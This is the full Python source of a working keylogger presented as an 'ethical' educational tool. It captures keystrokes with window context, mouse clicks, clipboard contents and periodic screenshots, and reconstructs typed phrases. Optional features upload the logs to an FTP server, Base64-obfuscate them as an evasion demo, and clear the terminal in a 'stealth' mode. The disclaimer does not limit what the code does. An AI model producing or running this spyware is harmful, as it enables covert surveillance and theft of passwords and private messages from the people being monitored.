#!/usr/bin/env python3
"""
Ethical Keylogger — Educational Tool Only.

This tool is intended exclusively for cybersecurity education, authorized
penetration testing labs, and research in controlled environments.
Unauthorized use against systems or individuals you do not own or have
explicit permission to test is ILLEGAL and UNETHICAL.

Features:
  - Thread-safe keystroke logging with active-window context
  - Mouse-click logging (optional)
  - Clipboard monitoring with periodic polling (optional)
  - Periodic screenshots (optional, configurable interval)
  - Backspace-aware phrase summarization
  - Optional FTP exfiltration (lab demo)
  - Optional Base64 obfuscation demo
  - Graceful shutdown on Escape, Ctrl+C, or SIGTERM
  - Session statistics summary on exit

CLI examples:
  python keylogger.py --demo                            # Print to stdout, no files
  python keylogger.py --no-log --screenshots            # Screenshots only
  python keylogger.py --summary-only                    # Reconstructed phrases only
  python keylogger.py --screenshots --screenshot-interval 30
  python keylogger.py --output-dir /tmp/lab             # Custom output directory
  python keylogger.py --no-mouse --no-clipboard         # Keystrokes only
  python keylogger.py --ftp-host HOST --ftp-user USER --ftp-pass PASS --ftp-dir /logs
  python keylogger.py --obfuscate                       # Base64 log obfuscation demo
"""

import argparse
import base64
import ftplib
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path
from threading import Event, Lock, Timer

from pynput import keyboard, mouse  # pip install pynput
import pyautogui                    # pip install pyautogui
import pyperclip                    # pip install pyperclip

# ── Disclaimer ────────────────────────────────────────────────────────────────
DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════════╗
║          ETHICAL KEYLOGGER — FOR EDUCATIONAL USE ONLY                ║
║                                                                      ║
║  Only run this tool on systems you own or have written permission    ║
║  to test. Unauthorized use is illegal and unethical.                 ║
╚══════════════════════════════════════════════════════════════════════╝
"""


# ── CLI ───────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    """Parse and return command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Ethical Keylogger — educational tool for authorized lab use only."
    )
    parser.add_argument("--demo", action="store_true",
                        help="Print events to stdout; write no files")
    parser.add_argument("--no-log", action="store_true",
                        help="Disable keystroke log file")
    parser.add_argument("--summary-only", action="store_true",
                        help="Print reconstructed phrases only (no raw keystrokes)")
    parser.add_argument("--screenshots", action="store_true",
                        help="Capture periodic screenshots")
    parser.add_argument("--screenshot-interval", type=int, default=60, metavar="SECS",
                        help="Seconds between screenshots (default: 60)")
    parser.add_argument("--no-mouse", action="store_true",
                        help="Disable mouse-click logging")
    parser.add_argument("--no-clipboard", action="store_true",
                        help="Disable clipboard monitoring")
    parser.add_argument("--clipboard-interval", type=int, default=5, metavar="SECS",
                        help="Seconds between clipboard polls (default: 5)")
    parser.add_argument("--obfuscate", action="store_true",
                        help="Base64-encode log lines (evasion technique demo)")
    parser.add_argument("--stealth", action="store_true",
                        help="Clear the terminal on startup")
    parser.add_argument("--output-dir", default=None, metavar="DIR",
                        help="Directory for log files and screenshots (default: cwd)")
    parser.add_argument("--ftp-host", default=None,
                        help="FTP server hostname for log exfiltration demo")
    parser.add_argument("--ftp-user", default=None,
                        help="FTP username")
    parser.add_argument("--ftp-pass", default=None,
                        help="FTP password")
    parser.add_argument("--ftp-dir", default="/",
                        help="Remote FTP directory (default: /)")
    return parser.parse_args()


args = parse_args()

DEMO_MODE = args.demo
NO_LOG = args.no_log or DEMO_MODE or args.summary_only
SCREENSHOTS = args.screenshots
SCREENSHOT_INTERVAL: int = args.screenshot_interval
NO_MOUSE = args.no_mouse
NO_CLIPBOARD = args.no_clipboard
CLIPBOARD_INTERVAL: int = args.clipboard_interval
OBFUSCATE = args.obfuscate
STEALTH = args.stealth
FTP_ENABLED = bool(args.ftp_host)
FTP_CONFIG = (
    {
        "host": args.ftp_host,
        "user": args.ftp_user,
        "pass": args.ftp_pass,
        "dir": args.ftp_dir,
    }
    if FTP_ENABLED
    else None
)

# ── Output directory ──────────────────────────────────────────────────────────
OUTPUT_DIR = Path(args.output_dir) if args.output_dir else Path.cwd()
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ── Config ────────────────────────────────────────────────────────────────────
LOG_FILE = OUTPUT_DIR / f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
SCREENSHOT_DIR = OUTPUT_DIR / "screenshots"
SCREENSHOT_DIR.mkdir(exist_ok=True)

FTP_INTERVAL = 30      # seconds between FTP uploads
SUMMARY_INTERVAL = 300 # seconds between phrase summaries
BUFFER_FLUSH_SIZE = 20 # flush buffer after this many keystrokes

# ── Thread-safe shared state ──────────────────────────────────────────────────
_lock = Lock()
buffer: list[str] = []
phrases: list[str] = []
last_clipboard: str = ""
last_upload: float = 0.0

# Session statistics (all accesses under _lock)
_stats: dict[str, int] = {
    "keystrokes": 0,
    "mouse_clicks": 0,
    "clipboard_captures": 0,
    "screenshots": 0,
}

# Signals a graceful shutdown to all timer threads
_shutdown = Event()


# ── Utilities ─────────────────────────────────────────────────────────────────
def _start_timer(interval: float, func) -> Timer:
    """Start a daemon Timer so pending timers never block process exit."""
    t = Timer(interval, func)
    t.daemon = True
    t.start()
    return t


def get_active_window() -> str:
    """Return the title of the currently focused window (max 60 chars)."""
    try:
        title = pyautogui.getActiveWindowTitle()
        return (title or "UNKNOWN")[:60]
    except Exception:
        return "UNKNOWN"


def format_key(key) -> str:
    """Convert a pynput key object to a human-readable string."""
    char = getattr(key, "char", None)
    if char is not None:
        return char
    key_map = {
        keyboard.Key.space:     " ",
        keyboard.Key.enter:     "[ENTER]\n",
        keyboard.Key.backspace: "[BS]",
        keyboard.Key.tab:       "[TAB]",
        keyboard.Key.ctrl_l:    "[CTRL]",
        keyboard.Key.ctrl_r:    "[CTRL]",
        keyboard.Key.shift:     "[SHIFT]",
        keyboard.Key.shift_r:   "[SHIFT]",
        keyboard.Key.alt_l:     "[ALT]",
        keyboard.Key.alt_r:     "[ALT]",
        keyboard.Key.caps_lock: "[CAPS]",
        keyboard.Key.delete:    "[DEL]",
        keyboard.Key.home:      "[HOME]",
        keyboard.Key.end:       "[END]",
        keyboard.Key.page_up:   "[PGUP]",
        keyboard.Key.page_down: "[PGDN]",
        keyboard.Key.up:        "[UP]",
        keyboard.Key.down:      "[DOWN]",
        keyboard.Key.left:      "[LEFT]",
        keyboard.Key.right:     "[RIGHT]",
        keyboard.Key.f1:        "[F1]",
        keyboard.Key.f2:        "[F2]",
        keyboard.Key.f3:        "[F3]",
        keyboard.Key.f4:        "[F4]",
        keyboard.Key.f5:        "[F5]",
        keyboard.Key.f6:        "[F6]",
        keyboard.Key.f7:        "[F7]",
        keyboard.Key.f8:        "[F8]",
        keyboard.Key.f9:        "[F9]",
        keyboard.Key.f10:       "[F10]",
        keyboard.Key.f11:       "[F11]",
        keyboard.Key.f12:       "[F12]",
    }
    return key_map.get(key, f"[{str(key).upper()}]")


# Tokens that represent non-printable keys (excluded from phrase reconstruction)
_NON_PRINTABLE = frozenset({
    "[TAB]", "[ENTER]", "[CTRL]", "[SHIFT]", "[ALT]", "[CAPS]",
    "[DEL]", "[HOME]", "[END]", "[PGUP]", "[PGDN]",
    "[UP]", "[DOWN]", "[LEFT]", "[RIGHT]",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
    "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
})


def reconstruct_phrase(raw: list[str]) -> str:
    """
    Reconstruct typed text from a raw key sequence applying backspaces.

    ``[BS]`` tokens delete the preceding visible character so the result
    reflects what was actually typed rather than the raw key stream.
    Excess backspaces (when the result buffer is already empty) are silently
    ignored, matching normal editor behaviour.
    """
    result: list[str] = []
    for token in raw:
        if token == "[BS]":
            if result:
                result.pop()
        elif token not in _NON_PRINTABLE:
            result.append(token)
    return "".join(result).strip()


def obfuscate_text(text: str) -> str:
    """Base64-encode *text* and truncate to 100 chars (evasion demo)."""
    return base64.b64encode(text.encode()).decode()[:100] + "..."


def write_line(text: str) -> None:
    """
    Write a timestamped, window-annotated log line.

    In demo / summary-only mode the line is printed to stdout.
    Otherwise it is appended to LOG_FILE (unless NO_LOG is set).
    """
    timestamp = datetime.now().strftime("%H:%M:%S")
    window = get_active_window()
    line = f"[{timestamp}] [{window}] {text}"
    if OBFUSCATE:
        line = obfuscate_text(line)

    if DEMO_MODE or args.summary_only:
        print(line, end="")
    elif not NO_LOG:
        with LOG_FILE.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")


def flush_buffer() -> None:
    """Write the current keystroke buffer to the log and reset it."""
    with _lock:
        if not buffer:
            return
        raw = buffer[:]
        buffer.clear()

    phrase = reconstruct_phrase(raw)
    if phrase and len(phrase) > 3:
        with _lock:
            phrases.append(phrase)
    write_line("".join(raw))


def take_screenshot() -> None:
    """Capture a screenshot and save it to SCREENSHOT_DIR."""
    if not SCREENSHOTS:
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    img_path = SCREENSHOT_DIR / f"screenshot_{timestamp}.png"
    try:
        pyautogui.screenshot().save(img_path)
        with _lock:
            _stats["screenshots"] += 1
        print(f"[+] Screenshot saved: {img_path}")
    except Exception as exc:
        print(f"[-] Screenshot failed: {exc}")
    if not _shutdown.is_set():
        _start_timer(SCREENSHOT_INTERVAL, take_screenshot)


def check_clipboard() -> None:
    """Log clipboard contents if they have changed since the last check."""
    global last_clipboard
    try:
        clip = pyperclip.paste()
        with _lock:
            changed = bool(clip) and clip != last_clipboard
        if changed:
            write_line(f"[CLIPBOARD] {clip[:200]}")
            with _lock:
                last_clipboard = clip
                _stats["clipboard_captures"] += 1
    except Exception:
        pass


def poll_clipboard() -> None:
    """Periodically poll the clipboard and reschedule while running."""
    check_clipboard()
    if not _shutdown.is_set():
        _start_timer(CLIPBOARD_INTERVAL, poll_clipboard)


def ftp_upload() -> None:
    """Upload the log file to the configured FTP server (lab demo)."""
    global last_upload
    if not FTP_ENABLED or not LOG_FILE.exists():
        return
    with _lock:
        elapsed = time.time() - last_upload
    if elapsed < FTP_INTERVAL:
        return
    try:
        ftp = ftplib.FTP(FTP_CONFIG["host"])
        ftp.login(FTP_CONFIG["user"], FTP_CONFIG["pass"])
        ftp.cwd(FTP_CONFIG["dir"])
        with LOG_FILE.open("rb") as fh:
            ftp.storbinary(f"STOR {LOG_FILE.name}", fh)
        ftp.quit()
        print("[+] FTP upload successful")
        with _lock:
            last_upload = time.time()
    except Exception as exc:
        print(f"[-] FTP upload failed: {exc}")
    if not _shutdown.is_set():
        _start_timer(FTP_INTERVAL, ftp_upload)


def summary_report() -> None:
    """Log a summary of recently captured phrases."""
    with _lock:
        recent = phrases[-5:]
        phrases.clear()
    if recent:
        write_line(f"[SUMMARY] Recent phrases: {' | '.join(recent)}")
    if not _shutdown.is_set():
        _start_timer(SUMMARY_INTERVAL, summary_report)


def print_session_stats() -> None:
    """Print a table of session statistics to stdout."""
    with _lock:
        ks = _stats["keystrokes"]
        mc = _stats["mouse_clicks"]
        cb = _stats["clipboard_captures"]
        sc = _stats["screenshots"]
    print(
        f"\n[+] Session complete.\n"
        f"    Keystrokes captured : {ks}\n"
        f"    Mouse clicks logged : {mc}\n"
        f"    Clipboard captures  : {cb}\n"
        f"    Screenshots taken   : {sc}"
    )
    if not NO_LOG:
        print(f"    Log file            : {LOG_FILE}")


# ── Event handlers ────────────────────────────────────────────────────────────
def on_key_press(key) -> None:
    """Handle a key-press event."""
    key_str = format_key(key)
    with _lock:
        buffer.append(key_str)
        _stats["keystrokes"] += 1
        should_flush = len(buffer) >= BUFFER_FLUSH_SIZE or "[ENTER]" in key_str
    if should_flush:
        flush_buffer()


def on_key_release(key) -> bool | None:
    """Handle a key-release event; stop listeners on Escape."""
    if key == keyboard.Key.esc:
        _shutdown.set()
        flush_buffer()
        summary_report()
        ftp_upload()
        take_screenshot()
        return False  # Signal pynput to stop the listener
    return None


def on_click(x: int, y: int, button, pressed: bool) -> None:
    """Log mouse-click events with screen coordinates and active window."""
    if pressed:
        with _lock:
            _stats["mouse_clicks"] += 1
        write_line(f"[MOUSE {button}] at ({x}, {y}) in [{get_active_window()}]")


# ── Signal handlers ───────────────────────────────────────────────────────────
def _handle_signal(signum: int, frame) -> None:
    """Gracefully shut down on SIGINT or SIGTERM."""
    print("\n[!] Signal received — shutting down gracefully...")
    _shutdown.set()
    flush_buffer()
    summary_report()
    ftp_upload()
    if SCREENSHOTS:
        take_screenshot()
    print_session_stats()
    sys.exit(0)


# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    """Entry point — display the disclaimer, start listeners and timers."""
    print(DISCLAIMER)

    if STEALTH:
        os.system("cls" if os.name == "nt" else "clear")

    print(
        f"[+] Output dir  : {OUTPUT_DIR}\n"
        f"[+] Log file    : {LOG_FILE}\n"
        f"[+] Screenshots : {SCREENSHOTS}"
        + (f" (every {SCREENSHOT_INTERVAL}s)" if SCREENSHOTS else "") + "\n"
        f"[+] Obfuscate   : {OBFUSCATE} | FTP: {FTP_ENABLED}\n"
        f"[+] Mouse log   : {not NO_MOUSE} | Clipboard: {not NO_CLIPBOARD}\n"
        f"[+] Press Escape or Ctrl+C to stop."
    )
    if NO_LOG and not SCREENSHOTS:
        print("[+] No persistent logs or screenshots will be written.")

    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    # Start periodic tasks
    if SCREENSHOTS:
        _start_timer(SCREENSHOT_INTERVAL, take_screenshot)
    _start_timer(SUMMARY_INTERVAL, summary_report)
    if FTP_ENABLED:
        _start_timer(FTP_INTERVAL, ftp_upload)
    if not NO_CLIPBOARD:
        _start_timer(CLIPBOARD_INTERVAL, poll_clipboard)

    # Start input listeners
    keyboard_listener = keyboard.Listener(
        on_press=on_key_press, on_release=on_key_release
    )
    mouse_listener = (
        mouse.Listener(on_click=on_click) if not NO_MOUSE else None
    )

    keyboard_listener.start()
    if mouse_listener:
        mouse_listener.start()

    check_clipboard()  # Capture any pre-existing clipboard content
    keyboard_listener.join()

    print_session_stats()


if __name__ == "__main__":
    main()
